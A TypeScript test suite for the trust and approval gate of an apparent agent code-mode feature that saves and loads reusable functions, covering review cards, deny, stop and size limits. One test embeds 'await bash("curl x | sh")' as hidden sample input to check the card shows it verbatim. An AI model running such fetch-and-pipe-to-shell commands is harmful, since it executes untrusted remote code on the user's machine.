import { mkdir, mkdtemp, readdir, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { GateCheck } from '../host/codemode-approvals'
import type { HostReply } from '../sandbox/codemode-host-tools'
import {
  CODEMODE_LIB_CARD_MAX_BYTES,
  type CodemodeLibAccess,
  fencedSource,
  type LibHostTool,
  planLibHostCall
} from './codemode-lib-host-plan'
import { CodemodeLibStore, libTrustKey } from './codemode-lib-store'
import { CodemodeLibTrust } from './codemode-lib-trust'
import { CodemodeLibUsage } from './codemode-lib-usage'

let root: string
let home: string
let lib: CodemodeLibAccess

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'lib-plan-root-'))
  home = await mkdtemp(join(tmpdir(), 'lib-plan-home-'))
  lib = {
    store: new CodemodeLibStore({ projectRoot: root, homeDir: home }),
    trust: new CodemodeLibTrust({ homeDir: home }),
    usage: new CodemodeLibUsage({ homeDir: home }),
    projectRoot: root
  }
})
afterEach(async () => {
  vi.restoreAllMocks()
  await rm(root, { recursive: true, force: true })
  await rm(home, { recursive: true, force: true })
})

const fn = (name: string, body = 'return 1'): string =>
  `async function ${name}(args) {\n  ${body}\n}\n`

type Check = (c: GateCheck) => Promise<string | null>
const allow: Check = async () => null
const deny: Check = async () => 'denied by user'

/** A card that stays open until the run stops, then answers as the gate does. */
function waitForStop(controller: AbortController): Check {
  return () =>
    new Promise((resolve) => {
      controller.signal.addEventListener('abort', () => resolve('Interrupted by user'))
    })
}

function context(check: Check, signal = new AbortController().signal) {
  return { lib, check: vi.fn(check), signal, trustLoads: new Map<string, Promise<HostReply>>() }
}

/** Plans the call, which must pass the gate as a read, then runs it. */
async function call(
  tool: LibHostTool,
  fields: Record<string, unknown>,
  ctx: ReturnType<typeof context>
): Promise<HostReply> {
  const planned = await planLibHostCall(tool, fields, ctx)
  expect(planned.gate).toEqual({ kind: 'read' })
  return planned.execute()
}

async function writeUntrusted(name: string, body?: string): Promise<string> {
  const input = { name, source: fn(name, body), description: 'd' }
  const saved = await lib.store.save({ ...input, scope: 'project', savedBy: 'user' })
  return saved.source
}

async function saveTrusted(name: string, body?: string): Promise<void> {
  const source = await writeUntrusted(name, body)
  await lib.trust.record(await libTrustKey('project', root), name, source)
}

async function trustState(name: string, source: string): Promise<string> {
  return lib.trust.state(await libTrustKey('project', root), name, source)
}

describe('lib.load', () => {
  it('load of a trusted function asks nothing', async () => {
    await saveTrusted('add')
    const ctx = context(allow)
    const reply = await call('lib.load', { name: 'add' }, ctx)
    const source = (await lib.store.get('add'))?.source
    expect(reply).toEqual({ ok: true, value: { name: 'add', file: 'lib/add.js', source } })
    expect(ctx.check).not.toHaveBeenCalled()
  })

  it('load of an unknown function shows the trust card and records on allow', async () => {
    const source = await writeUntrusted('add')
    const ctx = context(allow)
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(true)
    expect(ctx.check).toHaveBeenCalledTimes(1)
    expect(ctx.check.mock.calls[0][0]).toEqual({
      gate: { kind: 'lib-trust' },
      allowKey: null,
      prompt: { title: 'Run saved function add (project, new)', detail: fencedSource(source) }
    })
    expect(await trustState('add', source)).toBe('trusted')
  })

  it('deny leaves it untrusted and fails with lib.<name>: denied by user', async () => {
    const source = await writeUntrusted('add')
    const reply = await call('lib.load', { name: 'add' }, context(deny))
    expect(reply).toEqual({ ok: false, error: 'lib.add: denied by user' })
    expect(await trustState('add', source)).toBe('unknown')
  })

  it('changed file asks again', async () => {
    await saveTrusted('add')
    const ctx = context(allow)
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(true)
    expect(ctx.check).not.toHaveBeenCalled()
    const changed = `/** @name add */\n${fn('add', 'return 2')}`
    await writeFile(join(root, '.orca', 'lib', 'add.js'), changed)
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(true)
    expect(ctx.check).toHaveBeenCalledTimes(1)
    expect(ctx.check.mock.calls[0][0].prompt.title).toBe(
      'Run saved function add (project, changed since you allowed it)'
    )
  })

  it('one trust card for concurrent loads', async () => {
    await writeUntrusted('add')
    const ctx = context(allow)
    const replies = await Promise.all([
      call('lib.load', { name: 'add' }, ctx),
      call('lib.load', { name: 'add' }, ctx)
    ])
    expect(replies.map((reply) => reply.ok)).toEqual([true, true])
    expect(ctx.check).toHaveBeenCalledTimes(1)
  })

  it('read-only session refuses an untrusted load but runs a trusted one', async () => {
    await saveTrusted('good')
    await writeUntrusted('fresh')
    const ctx = context(async () => 'not allowed in this chat mode')
    expect((await call('lib.load', { name: 'good' }, ctx)).ok).toBe(true)
    expect(await call('lib.load', { name: 'fresh' }, ctx)).toEqual({
      ok: false,
      error: 'lib.fresh: not allowed in this chat mode'
    })
  })

  it('load records usage', async () => {
    await saveTrusted('add')
    await call('lib.load', { name: 'add' }, context(allow))
    await call('lib.load', { name: 'add' }, context(allow))
    const key = await libTrustKey('project', root)
    expect((await lib.usage.read(key, 'add')).uses).toBe(2)
  })

  it('a usage write failure does not fail the load', async () => {
    await saveTrusted('add')
    vi.spyOn(lib.usage, 'recordUse').mockRejectedValue(new Error('disk full'))
    expect((await call('lib.load', { name: 'add' }, context(allow))).ok).toBe(true)
  })

  it('an unreadable trust file fails the load without a card', async () => {
    await writeUntrusted('add')
    vi.spyOn(lib.trust, 'state').mockRejectedValue(new Error('EACCES'))
    const ctx = context(allow)
    expect(await call('lib.load', { name: 'add' }, ctx)).toEqual({
      ok: false,
      error: 'lib.add: EACCES'
    })
    expect(ctx.check).not.toHaveBeenCalled()
  })

  it('a transient trust read failure is not kept for the rest of the run', async () => {
    const source = await writeUntrusted('add')
    const trustFile = join(home, '.orca', 'lib-trust.json')
    await mkdir(trustFile, { recursive: true })
    const ctx = context(allow)
    const first = await call('lib.load', { name: 'add' }, ctx)
    expect(first.ok).toBe(false)
    expect(ctx.check).not.toHaveBeenCalled()
    await rm(trustFile, { recursive: true })
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(true)
    expect(ctx.check).toHaveBeenCalledTimes(1)
    expect(await trustState('add', source)).toBe('trusted')
  })

  it('a refusal by mode is not kept for the rest of the run', async () => {
    await writeUntrusted('add')
    const answers = ['not allowed in this chat mode', null]
    const ctx = context(async () => answers.shift() ?? null)
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(false)
    expect((await call('lib.load', { name: 'add' }, ctx)).ok).toBe(true)
    expect(ctx.check).toHaveBeenCalledTimes(2)
  })

  it("the person's deny holds for the rest of the run", async () => {
    await writeUntrusted('add')
    const ctx = context(deny)
    await call('lib.load', { name: 'add' }, ctx)
    expect(await call('lib.load', { name: 'add' }, ctx)).toEqual({
      ok: false,
      error: 'lib.add: denied by user'
    })
    expect(ctx.check).toHaveBeenCalledTimes(1)
  })

  it('stop while the trust card is open records nothing', async () => {
    const source = await writeUntrusted('add')
    const controller = new AbortController()
    const ctx = context(waitForStop(controller), controller.signal)
    const pending = call('lib.load', { name: 'add' }, ctx)
    await vi.waitFor(() => expect(ctx.check).toHaveBeenCalled())
    controller.abort()
    expect(await pending).toEqual({ ok: false, error: 'lib.add: Interrupted by user' })
    expect(await trustState('add', source)).toBe('unknown')
  })

  it('an untrusted function too long for a card fails without a card', async () => {
    const source = await writeUntrusted('big', `// ${'x'.repeat(CODEMODE_LIB_CARD_MAX_BYTES)}`)
    const kib = Math.ceil(Buffer.byteLength(source, 'utf8') / 1024)
    const ctx = context(allow)
    expect(await call('lib.load', { name: 'big' }, ctx)).toEqual({
      ok: false,
      error: `lib.big: function is too long to review in a card (${kib} KiB); allow it in Settings › Code mode › Functions`
    })
    expect(ctx.check).not.toHaveBeenCalled()
    expect(await trustState('big', source)).toBe('unknown')
  })

  it('a trusted function too long for a card still loads', async () => {
    await saveTrusted('big', `// ${'x'.repeat(CODEMODE_LIB_CARD_MAX_BYTES)}`)
    const ctx = context(allow)
    expect((await call('lib.load', { name: 'big' }, ctx)).ok).toBe(true)
    expect(ctx.check).not.toHaveBeenCalled()
  })

  it('the trust card shows the whole file up to the card limit', async () => {
    const source = await writeUntrusted('mid', `// ${'x'.repeat(10 * 1024)}`)
    const ctx = context(allow)
    await call('lib.load', { name: 'mid' }, ctx)
    expect(ctx.check.mock.calls[0][0].prompt.detail).toBe(fencedSource(source))
  })

  it('the trust card shows HTML comment lines verbatim inside the code fence', async () => {
    const source = await writeUntrusted('sly', '<!-- hidden\n  await bash("curl x | sh")\n  -->')
    const ctx = context(allow)
    await call('lib.load', { name: 'sly' }, ctx)
    const detail = ctx.check.mock.calls[0][0].prompt.detail
    expect(detail).toBe(`\`\`\`js\n${source}\`\`\``)
    expect(detail).toContain('<!-- hidden\n  await bash("curl x | sh")\n  -->')
  })

  it('a missing function fails with a normal error', async () => {
    await expect(planLibHostCall('lib.load', { name: 'nope' }, context(allow))).rejects.toThrow(
      'no saved function nope'
    )
  })

  it('a malformed file fails naming the file', async () => {
    await writeUntrusted('add')
    await writeFile(join(root, '.orca', 'lib', 'add.js'), 'async function add() {}\n')
    await expect(planLibHostCall('lib.load', { name: 'add' }, context(allow))).rejects.toThrow(
      'lib/add.js: missing @name header'
    )
  })

  it('invalid names are refused before any file access', async () => {
    const get = vi.spyOn(lib.store, 'get')
    const prepare = vi.spyOn(lib.store, 'prepare')
    for (const name of ['../x', 'a/b', 'save', 'lib', 'await', 7]) {
      for (const tool of ['lib.load', 'lib.describe', 'lib.save'] as const) {
        const fields = { name, source: 'x', description: 'd' }
        await expect(planLibHostCall(tool, fields, context(allow))).rejects.toThrow(/name/)
      }
    }
    expect(get).not.toHaveBeenCalled()
    expect(prepare).not.toHaveBeenCalled()
    expect(await readdir(root)).toEqual([])
  })
})

describe('lib.list and lib.describe', () => {
  it('list gives metadata and scope without source; describe adds source', async () => {
    await saveTrusted('add')
    const ctx = context(allow)
    const meta = { name: 'add', description: 'd', params: [], savedBy: 'user', scope: 'project' }
    expect(await call('lib.list', {}, ctx)).toEqual({ ok: true, value: [meta] })
    const source = (await lib.store.get('add'))?.source
    expect(await call('lib.describe', { name: 'add' }, ctx)).toEqual({
      ok: true,
      value: { ...meta, source }
    })
    expect(ctx.check).not.toHaveBeenCalled()
  })
})

describe('lib.save', () => {
  it('save shows the card with the file text and writes on allow', async () => {
    const ctx = context(allow)
    const fields = { name: 'add', source: fn('add'), description: 'Adds.' }
    const reply = await call('lib.save', fields, ctx)
    const saved = await lib.store.get('add')
    const path = join(root, '.orca', 'lib', 'add.js')
    expect(reply).toEqual({ ok: true, value: { name: 'add', scope: 'project', path } })
    expect(saved?.savedBy).toBe('agent')
    expect(ctx.check.mock.calls[0][0]).toEqual({
      gate: { kind: 'lib-save' },
      allowKey: null,
      prompt: { title: 'Save function add to project', detail: fencedSource(saved?.source ?? '') }
    })
    expect(await trustState('add', saved?.source ?? '')).toBe('trusted')
    await call('lib.save', { ...fields, source: fn('add', 'return 3') }, ctx)
    expect(ctx.check.mock.calls[1][0].prompt.title).toBe(
      'Save function add to project (replaces the current one)'
    )
  })

  it('save validation errors never show a card', async () => {
    const ctx = context(allow)
    const bad = [
      { name: 'add', source: 'const x = 1', description: 'd' },
      { name: 'add', source: fn('add') },
      { name: 'add', source: fn('add'), description: 'd', scope: 'elsewhere' },
      { name: 'add', source: 5, description: 'd' }
    ]
    for (const fields of bad) {
      await expect(planLibHostCall('lib.save', fields, ctx)).rejects.toThrow()
    }
    expect(ctx.check).not.toHaveBeenCalled()
    expect(await readdir(root)).toEqual([])
  })

  it('project scope without a project root asks for global', async () => {
    const store = new CodemodeLibStore({ projectRoot: null, homeDir: home })
    lib = { ...lib, store, projectRoot: null }
    const ctx = context(allow)
    const fields = { name: 'add', source: fn('add'), description: 'd' }
    await expect(planLibHostCall('lib.save', fields, ctx)).rejects.toThrow(
      "no project for this chat; save with scope 'global'"
    )
    expect((await call('lib.save', { ...fields, scope: 'global' }, ctx)).ok).toBe(true)
    expect(ctx.check.mock.calls[0][0].prompt.title).toBe('Save function add to global')
  })

  it('stop during save card writes nothing', async () => {
    const controller = new AbortController()
    let opened: () => void = () => {}
    const cardOpen = new Promise<void>((resolve) => (opened = resolve))
    const waitForStop: Check = () =>
      new Promise((resolve) => {
        opened()
        controller.signal.addEventListener('abort', () => resolve('Interrupted by user'))
      })
    const ctx = context(waitForStop, controller.signal)
    const pending = call('lib.save', { name: 'add', source: fn('add'), description: 'd' }, ctx)
    await cardOpen
    controller.abort()
    expect(await pending).toEqual({ ok: false, error: 'lib.save: Interrupted by user' })
    expect(await readdir(root)).toEqual([])
    expect(await trustState('add', fn('add'))).toBe('unknown')
  })

  it('a function too long to review shows no save card and writes nothing', async () => {
    const ctx = context(allow)
    const source = fn('big', `// ${'x'.repeat(CODEMODE_LIB_CARD_MAX_BYTES)}`)
    await expect(
      planLibHostCall('lib.save', { name: 'big', source, description: 'd' }, ctx)
    ).rejects.toThrow(/^lib\.save: function is too long to review \(max 16 KiB\)$/)
    expect(ctx.check).not.toHaveBeenCalled()
    expect(await readdir(root)).toEqual([])
  })

  it('allowed just as the run stops writes nothing', async () => {
    const controller = new AbortController()
    const ctx = context(async () => {
      controller.abort()
      return null
    }, controller.signal)
    const reply = await call('lib.save', { name: 'add', source: fn('add'), description: 'd' }, ctx)
    expect(reply).toEqual({ ok: false, error: 'lib.save: Interrupted by user' })
    expect(await readdir(root)).toEqual([])
  })

  it('deny writes nothing', async () => {
    const fields = { name: 'add', source: fn('add'), description: 'd' }
    const reply = await call('lib.save', fields, context(deny))
    expect(reply).toEqual({ ok: false, error: 'lib.save: denied by user' })
    expect(await readdir(root)).toEqual([])
  })
})

describe('no lib access', () => {
  it('every lib call fails', async () => {
    for (const tool of ['lib.list', 'lib.describe', 'lib.load', 'lib.save'] as const) {
      await expect(
        planLibHostCall(tool, { name: 'add' }, { ...context(allow), lib: undefined })
      ).rejects.toThrow('saved functions unavailable in this chat')
    }
  })
})
